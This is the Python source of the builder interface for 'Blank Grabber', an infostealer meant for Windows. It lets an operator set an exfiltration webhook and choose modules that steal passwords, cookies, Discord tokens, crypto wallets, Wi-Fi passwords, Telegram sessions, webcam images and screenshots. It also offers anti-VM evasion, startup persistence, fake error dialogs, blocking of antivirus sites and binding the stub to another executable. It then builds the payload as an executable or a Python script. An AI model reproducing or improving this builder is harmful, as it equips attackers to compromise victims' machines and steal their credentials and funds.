import ctypes
import os
import subprocess
import sys
import json
import ctypes
import shutil
import ast
import webbrowser

import customtkinter as ctk
from tkinter import messagebox, filedialog
from pkg_resources import parse_version
from socket import create_connection
from tkinter import messagebox
from urllib.request import urlopen, Request
from PIL import Image
from io import BytesIO
from configparser import ConfigParser

class Utility:

	UpdatesCheck: bool = True
	Password: str = "blank"

	@staticmethod
	def ToggleConsole(choice: bool) -> None:
		if choice:
			# Show Console
			ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 4)
		else:
			# Hide Console
			ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

	@staticmethod
	def IsAdmin() -> bool:
		try:
			return ctypes.windll.shell32.IsUserAnAdmin() == 1
		except Exception:
			return False
		
	@staticmethod
	def GetSelfDir() -> str:
		return os.path.dirname(__file__)
	
	@staticmethod
	def CheckInternetConnection() -> bool:
		try:
			create_connection(("www.google.com", 80), timeout= 3.0)
			return True
		except Exception:
			return False
	
	@staticmethod
	def CheckForUpdates() -> bool:
		if Utility.UpdatesCheck:
			print("Checking for updates...")
			hashFilePath = os.path.join(os.path.dirname(__file__), "Extras", "hash")
			if os.path.isfile(hashFilePath):
				with open(hashFilePath, "r") as f:
					content = f.read()
			
				try:
					_hash = json.loads(content)["hash"]
					newhash = json.loads(urlopen("https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Extras/hash", timeout= 5).read().decode())["hash"]

					os.system("cls")
					return _hash != newhash # New update available
				except Exception:
					pass
			os.system("cls")
		return False
	
	@staticmethod
	def CheckConfiguration() -> None:
		configFile = os.path.join(os.path.dirname(__file__), "config.ini")
		modified = False
		password = "blank"
		updatesCheck = True

		config = ConfigParser()

		if os.path.isfile(configFile):
			config.read(configFile)
		else:
			print("Do you regularly want to check for updates whenever you start this application? : [Y (default)/N]")
			updatesCheck = input("--> ").strip().lower().startswith("y") or updatesCheck

			print("Set a password (without whitespaces) for the archive for security reasons. (default: %r)" % password)
			password = "_".join(input("--> ").strip().split()) or password

			os.system("cls")
			
			config["Settings"] = {
				"CheckForUpdates" : updatesCheck,
				"PasswordForArchives" : password
			}
		
		if config.has_section("Settings"):
			Settings = config["Settings"]
			_updatesCheck = Settings.get("CheckForUpdates")
			if not isinstance(_updatesCheck, bool):
				modified = True
			else:
				updatesCheck = _updatesCheck

			_password = Settings.get("PasswordForArchives")
			if not isinstance(_password, str) or not _password:
				modified = True
			else:
				password = _password
		else:
			modified = True
		
		if modified:
			newconfig = ConfigParser()
			newconfig["Settings"] = {
				"CheckForUpdates" : updatesCheck,
				"PasswordForArchives" : password
			}

			with open(configFile, "w") as file:
				newconfig.write(file)
		
		Utility.UpdatesCheck = updatesCheck
		Utility.Password = password

class BuilderOptionsFrame(ctk.CTkFrame):

	def __init__(self, master) -> None:
		super().__init__(master, fg_color= "transparent")

		self.fakeErrorData = [False, ("", "", 0)] # (Title, Message, Icon)

		self.grid_propagate(False)

		self.font = ctk.CTkFont(size= 20)

		self.webhookVar = ctk.StringVar(self)
		self.pingMeVar = ctk.BooleanVar(self)
		self.vmProtectVar = ctk.BooleanVar(self)
		self.startupVar = ctk.BooleanVar(self)
		self.meltVar = ctk.BooleanVar(self)

		self.captureWebcamVar = ctk.BooleanVar(self)
		self.capturePasswordsVar = ctk.BooleanVar(self)
		self.captureCookiesVar = ctk.BooleanVar(self)
		self.captureHistoryVar = ctk.BooleanVar(self)
		self.captureDiscordTokensVar = ctk.BooleanVar(self)
		self.captureGamesVar = ctk.BooleanVar(self)
		self.captureWifiPasswordsVar = ctk.BooleanVar(self)
		self.captureSystemInfoVar = ctk.BooleanVar(self)
		self.captureScreenshotVar = ctk.BooleanVar(self)
		self.captureTelegramVar = ctk.BooleanVar(self)
		self.captureWalletsVar = ctk.BooleanVar(self)
		self.fakeErrorVar = ctk.BooleanVar(self)
		self.blockAvSitesVar = ctk.BooleanVar(self)
		self.discordInjectionVar = ctk.BooleanVar(self)
		
		self.boundExePath = ""
		self.iconBytes = ""

		self.OutputAsExe = True

		for i in range(6):
			self.rowconfigure(i, weight= 1)
		
		for i in range(6):
			self.columnconfigure(i, weight= 1)

		webhookEntry = ctk.CTkEntry(self, placeholder_text= "Enter Webhook Here", height= 38, font= self.font, textvariable= self.webhookVar)
		webhookEntry.grid(row= 0, column= 0, sticky= "ew", padx= (15, 5), columnspan= 5)

		testWebhookButton = ctk.CTkButton(self, text= "Test Webhook", height= 38, font= self.font, fg_color= "#454545", hover_color= "#4D4D4D", command= self.testWebhookButton_Callback)
		testWebhookButton.grid(row= 0, column= 5, sticky= "ew", padx = (5, 15))
		
		pingMeCheckbox = ctk.CTkCheckBox(self, text= "Ping Me", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", variable= self.pingMeVar)
		pingMeCheckbox.grid(row= 1, column= 0, sticky= "w", padx= 20)

		vmProtect = ctk.CTkCheckBox(self, text= "Anti VM", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", variable= self.vmProtectVar)
		vmProtect.grid(row= 2, column= 0, sticky= "w", padx= 20)

		startup = ctk.CTkCheckBox(self, text= "Put On Startup", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", variable= self.startupVar)
		startup.grid(row= 3, column= 0, sticky= "w", padx= 20)

		melt = ctk.CTkCheckBox(self, text= "Melt Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", variable= self.meltVar)
		melt.grid(row= 4, column= 0, sticky= "w", padx= 20)

		captureWebcam = ctk.CTkCheckBox(self, text= "Webcam", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureWebcamVar)
		captureWebcam.grid(row= 1, column= 1, sticky= "w", padx= 20)

		capturePasswords = ctk.CTkCheckBox(self, text= "Passwords", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.capturePasswordsVar)
		capturePasswords.grid(row= 2, column= 1, sticky= "w", padx= 20)

		captureCookies = ctk.CTkCheckBox(self, text= "Cookies", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureCookiesVar)
		captureCookies.grid(row= 3, column= 1, sticky= "w", padx= 20)

		captureHistory = ctk.CTkCheckBox(self, text= "History", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureHistoryVar)
		captureHistory.grid(row= 4, column= 1, sticky= "w", padx= 20)

		captureDiscordTokens = ctk.CTkCheckBox(self, text= "Discord Tokens", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureDiscordTokensVar)
		captureDiscordTokens.grid(row= 1, column= 2, sticky= "w", padx= 20)

		captureGames = ctk.CTkCheckBox(self, text= "Games", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureGamesVar)
		captureGames.grid(row= 2, column= 2, sticky= "w", padx= 20)

		captureWallets = ctk.CTkCheckBox(self, text= "Wallets", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureWalletsVar)
		captureWallets.grid(row= 3, column= 2, sticky= "w", padx= 20)

		captureWifiPasswords = ctk.CTkCheckBox(self, text= "Wifi Passwords", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureWifiPasswordsVar)
		captureWifiPasswords.grid(row= 4, column= 2, sticky= "w", padx= 20)

		captureSysteminfo = ctk.CTkCheckBox(self, text= "System Info", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureSystemInfoVar)
		captureSysteminfo.grid(row= 1, column= 3, sticky= "w", padx= 20)

		captureScreenshot = ctk.CTkCheckBox(self, text= "Screenshot", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureScreenshotVar)
		captureScreenshot.grid(row= 2, column= 3, sticky= "w", padx= 20)

		captureTelegram = ctk.CTkCheckBox(self, text= "Telegram", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureTelegramVar)
		captureTelegram.grid(row= 3, column= 3, sticky= "w", padx= 20)

		fakeError = ctk.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", command= self.fakeError_Event, variable= self.fakeErrorVar)
		fakeError.grid(row= 1, column= 4, sticky= "w", padx= 20)

		blockAvSites = ctk.CTkCheckBox(self, text= "Block AV Sites", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", variable= self.blockAvSitesVar)
		blockAvSites.grid(row= 2, column= 4, sticky= "w", padx= 20)

		discordInjection = ctk.CTkCheckBox(self, text= "Discord Injection", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", variable= self.discordInjectionVar)
		discordInjection.grid(row= 3, column= 4, sticky= "w", padx= 20)

		bindExeButton = ctk.CTkButton(self, text= "Bind Executable", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= lambda: self.bindExeButton_Callback(bindExeButton))
		bindExeButton.grid(row= 1, column= 5, sticky= "ew", padx= (0, 15))

		selectIconButton = ctk.CTkButton(self, text= "Select Icon", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= lambda: self.selectIconButton_Callback(selectIconButton))
		selectIconButton.grid(row= 2, column= 5, sticky= "ew", padx= (0, 15))

		buildModeButton = ctk.CTkButton(self, text= "Output: Executable", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= lambda: self.buildModeButton_Callback(buildModeButton))
		buildModeButton.grid(row= 3, column= 5, sticky= "ew", padx= (0, 15))

		buildButton = ctk.CTkButton(self, text= "Build", height= 38, font= self.font, fg_color= "#1E5128", hover_color= "#4E9F3D", command= self.buildButton_Callback)
		buildButton.grid(row= 5, column= 5, sticky= "ew", padx= (0, 15))
	
	def bindExeButton_Callback(self, button: ctk.CTkButton) -> None:
		ENABLED = "Unbind Executable"
		DISABLED = "Bind Executable"

		buttonText = button.cget("text")

		if buttonText == DISABLED:
			allowedFiletypes = (("Executable file", "*.exe"),)
			filePath = ctk.filedialog.askopenfilename(title= "Select file to bind", initialdir= ".", filetypes= allowedFiletypes)
			if os.path.isfile(filePath):
				self.boundExePath = filePath
				button.configure(text= ENABLED)
		
		elif buttonText == ENABLED:
			self.boundExePath = ""
			button.configure(text= DISABLED)
	
	def selectIconButton_Callback(self, button: ctk.CTkButton) -> None:
		ENABLED = "Unselect Icon"
		DISABLED = "Select Icon"

		buttonText = button.cget("text")

		if buttonText == DISABLED:
			allowedFiletypes = (("Image", ["*.ico", "*.bmp", "*.gif", "*.jpeg", "*.png", "*.tiff", "*.webp"]), ("Any file", "*"))
			filePath = ctk.filedialog.askopenfilename(title= "Select icon", initialdir= ".", filetypes= allowedFiletypes)
			if os.path.isfile(filePath):
				try:
					buffer = BytesIO()
					with Image.open(filePath) as image:
						image.save(buffer, format= "ico")

					self.iconBytes = buffer.getvalue()
				except Exception:
					messagebox.showerror("Error", "Unable to convert the image to icon!")
				else:
					button.configure(text= ENABLED)
		
		elif buttonText == ENABLED:
			self.iconBytes = b""
			button.configure(text= DISABLED)
	
	def buildModeButton_Callback(self, button: ctk.CTkButton) -> None:
		EXEMODE = "Output: Executable"
		PYMODE = "Output: Python Script"

		self.OutputAsExe = not self.OutputAsExe

		button.configure(text= EXEMODE if self.OutputAsExe else PYMODE)
	
	def buildButton_Callback(self) -> None:
		webhook = self.webhookVar.get().strip()

		if len(webhook) == 0:
			messagebox.showerror("Error", "Webhook cannot be empty!")
			return
		
		elif not webhook.startswith(("http://", "https://")) or any(char.isspace() for char in webhook):
			messagebox.showerror("Error", "Invalid Webhook!")
			return
		
		
		elif not Utility.CheckInternetConnection():
			messagebox.showwarning("Warning", "Unable to connect to the internet!")
			return
		
		elif not (self.captureWebcamVar.get() or self.capturePasswordsVar.get() or self.captureCookiesVar.get() or self.captureHistoryVar.get() or self.captureDiscordTokensVar.get() or self.captureGamesVar.get() or self.captureWalletsVar.get() or self.captureWifiPasswordsVar.get() or self.captureSystemInfoVar.get() or self.captureScreenshotVar.get() or self.captureTelegramVar.get()):
			messagebox.showwarning("Warning", "You must select at least one of the stealer modules!")
			return
		
		config= {
    		"settings" : {
        		"webhook" : webhook,
        		"pingme" : self.pingMeVar.get(),
        		"vmprotect" : self.vmProtectVar.get(),
        		"startup" : self.startupVar.get(),
        		"melt" : self.meltVar.get(),
				"archivePassword" : Utility.Password
    		},
    
    		"modules" : {
        		"captureWebcam" : self.captureWebcamVar.get(),
        		"capturePasswords" : self.capturePasswordsVar.get(),
        		"captureCookies" : self.captureCookiesVar.get(),
        		"captureHistory" : self.captureHistoryVar.get(),
        		"captureDiscordTokens" : self.captureDiscordTokensVar.get(),
				"captureGames" : self.captureGamesVar.get(),
        		"captureWifiPasswords" : self.captureWifiPasswordsVar.get(),
        		"captureSystemInfo" : self.captureSystemInfoVar.get(),
        		"captureScreenshot" : self.captureScreenshotVar.get(),
        		"captureTelegramSession" : self.captureTelegramVar.get(),
				"captureWallets" : self.captureWalletsVar.get(),

        		"fakeError" : self.fakeErrorData,
        		"blockAvSites" : self.blockAvSitesVar.get(),
        		"discordInjection" : self.discordInjectionVar.get()
    		}
		}

		configData = json.dumps(config, indent= 4)

		if self.OutputAsExe:
			self.master.BuildExecutable(configData, self.iconBytes, self.boundExePath)
		else:
			self.master.BuildPythonFile(configData, self.iconBytes, self.boundExePath)
			
	def testWebhookButton_Callback(self) -> None:
		webhook = self.webhookVar.get().strip()
		if len(webhook) == 0:
			messagebox.showerror("Error", "Webhook cannot be empty!")
			return
		
		if not webhook.startswith(("http://", "https://")) or any(char.isspace() for char in webhook):
			messagebox.showerror("Error", "Invalid Webhook!")
			return
		
		elif not "discord" in webhook:
			messagebox.showwarning("Warning", "Webhook does not seems to be a discord webhook!")
			return
		
		elif not Utility.CheckInternetConnection():
			messagebox.showwarning("Warning", "Unable to connect to the internet!")
			return
		
		data = json.dumps({"content" : "Your webhook is working!"})

		req = Request(url= webhook, method= "POST", data= data.encode(), headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})

		try:
			status = urlopen(req).status
			if status == 204:
				messagebox.showinfo("Success", "Your webhook seems to be working!")
			else:
				raise Exception()
		except Exception:
			messagebox.showwarning("Warning", "Your webhook does not seems to be working!")
	
	def fakeError_Event(self) -> None:
		if not self.fakeErrorVar.get():
			self.fakeErrorData = [False, ("", "", 0)]
		else:
			fakeErrorBuilder = FakeErrorBuilder(self)
			self.wait_window(fakeErrorBuilder)
			self.fakeErrorVar.set(self.fakeErrorData[0])
		
	
class FakeErrorBuilder(ctk.CTkToplevel):

	def __init__(self, master) -> None:
		super().__init__(master)
		self.grab_set()
		self.geometry("833x563")

		self.master = master

		self.rowconfigure(0, weight= 1)
		self.rowconfigure(1, weight= 1)
		self.rowconfigure(2, weight= 1)
		self.rowconfigure(3, weight= 1)
		self.rowconfigure(4, weight= 1)
		self.rowconfigure(5, weight= 1)
		self.rowconfigure(6, weight= 1)
		self.rowconfigure(7, weight= 2)

		self.columnconfigure(1, weight= 1)

		self.iconVar = ctk.IntVar(self, value= 0)

		self.titleEntry = ctk.CTkEntry(self, placeholder_text= "Enter title here", height= 35, font= ctk.CTkFont(size= 20))
		self.titleEntry.grid(row = 0, column= 1, padx= 20, sticky= "ew", columnspan= 2)

		self.messageEntry = ctk.CTkEntry(self, placeholder_text= "Enter message here", height= 35, font= ctk.CTkFont(size= 20))
		self.messageEntry.grid(row = 1, column= 1, padx= 20, sticky= "ew", columnspan= 2)

		self.iconChoiceSt = ctk.CTkRadioButton(self, text= "Stop", value= 0, variable= self.iconVar, font= ctk.CTkFont(size= 20))
		self.iconChoiceSt.grid(row= 3, column= 1, sticky= "w", padx= 20)

		self.iconChoiceQn = ctk.CTkRadioButton(self, text= "Question", value= 16, variable= self.iconVar, font= ctk.CTkFont(size= 20))
		self.iconChoiceQn.grid(row= 4, column= 1, sticky= "w", padx= 20)

		self.iconChoiceWa = ctk.CTkRadioButton(self, text= "Warning", value= 32, variable= self.iconVar, font= ctk.CTkFont(size= 20))
		self.iconChoiceWa.grid(row= 5, column= 1, sticky= "w", padx= 20)

		self.iconChoiceIn = ctk.CTkRadioButton(self, text= "Information", value= 48, variable= self.iconVar, font= ctk.CTkFont(size= 20))
		self.iconChoiceIn.grid(row= 6, column= 1, sticky= "w", padx= 20)

		self.testButton = ctk.CTkButton(self, text= "Test", height= 28, font= ctk.CTkFont(size= 20), fg_color= "#393646", hover_color= "#6D5D6E", command= self.testFakeError)
		self.testButton.grid(row= 3, column= 2, padx= 20)

		self.saveButton = ctk.CTkButton(self, text= "Save", height= 28, font= ctk.CTkFont(size= 20), fg_color= "#393646", hover_color= "#6D5D6E", command= self.saveFakeError)
		self.saveButton.grid(row= 4, column= 2, padx= 20)
	
	def testFakeError(self) -> None:
		title= self.titleEntry.get()
		message= self.messageEntry.get()
		icon= self.iconVar.get()

		if title.strip() == "":
			title= "Title"
			self.titleEntry.insert(0, title)
		
		if message.strip() == "":
			message= "Message"
			self.messageEntry.insert(0, message)
		
		cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, icon)
		subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
	
	def saveFakeError(self) -> None:
		title= self.titleEntry.get().replace("\x22", "\\x22").replace("\x27", "\\x27")
		message= self.messageEntry.get().replace("\x22", "\\x22").replace("\x27", "\\x27")

		icon= self.iconVar.get()

		if title.strip() == message.strip() == "":
			self.master.fakeErrorData = [False, ("", "", 0)]
			self.destroy()

		elif title.strip() == "":
			cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Title cannot be empty', 0, 'Error', 0+16);close()"'''.format(message, title, icon)
			subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
			return
		
		elif message.strip() == "":
			cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Message cannot be empty', 0, 'Error', 0+16);close()"'''.format(message, title, icon)
			subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
			return
		
		self.master.fakeErrorData = [True, (title, message, icon)]
		self.destroy()

class Builder(ctk.CTk):
	
	def __init__(self) -> None:
		super().__init__()

		ctk.set_appearance_mode("dark")
		self.title("Blank Grabber [Builder]")
		self.iconbitmap(os.path.join("Extras", "icon.ico"))
		self.geometry("1250x600")
		self.resizable(False, False)

		self.rowconfigure(0, weight= 1)
		self.rowconfigure(1, weight= 5)

		self.columnconfigure(0, weight= 1)
		self.columnconfigure(1, weight= 0)

		self.titleLabel = ctk.CTkLabel(self, text= "Blank Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
		self.titleLabel.grid(row= 0, column= 0)

		self.builderOptions = BuilderOptionsFrame(self)
		self.builderOptions.grid(row= 1, column= 0, sticky= "nsew")
	
	def BuildPythonFile(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
		options: dict = json.loads(config)
		excludeList = []

		if options["modules"]["fakeError"][0]:
			excludeList.append("Fake Error")
		
		if options["modules"]["captureWebcam"]:
			excludeList.append("Capture Webcam")
		
		if options["settings"]["startup"]:
			excludeList.append("Put On Startup")
		
		if iconFileBytes:
			excludeList.append("Icon")
		
		if boundFilePath:
			excludeList.append("Bind Executable")
		
		if excludeList:
			message = "You are exporting the stub as a Python script. The following features will not work if you continue:\n\n" + "\n".join(["%d) %s" % (n+1, x) for n, x in enumerate(excludeList)]) + "\n\nDo you still want to continue?"
			if not messagebox.askyesno("Confirmation", message):
				return
		
		outPath = filedialog.asksaveasfilename(confirmoverwrite= True, defaultextension= ".py", filetypes= [("Python Script", ["*.py","*.pyw"])], initialfile= "stub.py", title= "Save as")
		if outPath is None:
			return
		
		with open(os.path.join(os.path.dirname(__file__), "Components", "stub.py")) as file:
			code = file.read()
		
		sys.path.append(os.path.join(os.path.dirname(__file__), "Components")) # Adds Components to PATH

		from Components import process
		_, injection = process.ReadSettings()
		code = process.WriteSettings(code, options, injection)

		if os.path.isfile(outPath):
			os.remove(outPath)

		try: 
			code = ast.unparse(ast.parse(code)) # Removes comments
		except Exception: 
			pass

		code = "# pip install pyaesm pillow urllib3\n\n" + code

		with open(outPath, "w") as file:
			file.write(code)

		messagebox.showinfo("Success", "File saved as %r" % outPath)
	
	def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
		def Exit(code: int = 0) -> None:
			os.system("pause > NUL")
			exit(code)
		
		def clear() -> None:
			os.system("cls")
		
		def format(title: str, description: str) -> str:
			return "[{}\u001b[0m] \u001b[37;1m{}\u001b[0m".format(title, description)
		
		self.destroy()
		Utility.ToggleConsole(True)
		ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True)
		clear()

		if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")):
			if not os.path.isfile(os.path.join("env", "Scripts", "activate")):
				print(format("\u001b[33;1mINFO", "Creating virtual environment... (might take some time)"))
				res = subprocess.run("python -m venv env", capture_output= True, shell= True)
				clear()
				if res.returncode != 0:
					print('Error while creating virtual environment ("python -m venv env"): {}'.format(res.stderr.decode(errors= "ignore")))
					Exit(1)

			print(format("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
			for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Components")):
				if os.path.isfile(fileloc := os.path.join(datadir, i)):
					shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
				else:
					shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))

		with open(os.path.join(os.path.dirname(__file__), "env", "Scripts", "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
			file.write(config)

		clear()

		os.chdir(os.path.join(os.path.dirname(__file__), "env", "Scripts"))

		if os.path.isfile("icon.ico"):
			os.remove("icon.ico")
		
		if iconFileBytes:
			with open("icon.ico", "wb") as file:
				file.write(iconFileBytes)

		if os.path.isfile("bound.exe"):
			os.remove("bound.exe")

		if os.path.isfile(boundFilePath):
			shutil.copy(boundFilePath, "bound.exe")

		os.startfile("run.bat")

if __name__ == "__main__":

	if os.name == "nt":
		if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Components")):
			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Components folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
			exit(1)
		
		version = '.'.join([str(x) for x in (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)])
		if not (parse_version(version) > parse_version("3.10")):
			subprocess.Popen(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {version} but version 3.10+ is required. Please update your Python installation!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
			exit(1)
		if "windowsapps" in sys.executable.lower():
			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'It looks like you installed Python from Windows Store instead of using the official website https://python.org. Please disable/uninstall it and reinstall from the website.\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
			exit(1)
		
		if Utility.CheckForUpdates():
			response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app? (you would be directed to the official github repository)")
			if response:
				webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
				exit(0)
		
		Utility.CheckConfiguration()
	
		Utility.ToggleConsole(False)
		
		if not Utility.IsAdmin():
			ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
			exit(0)
		
		Builder().mainloop()

	else:
		print("Only Windows OS is supported!")
		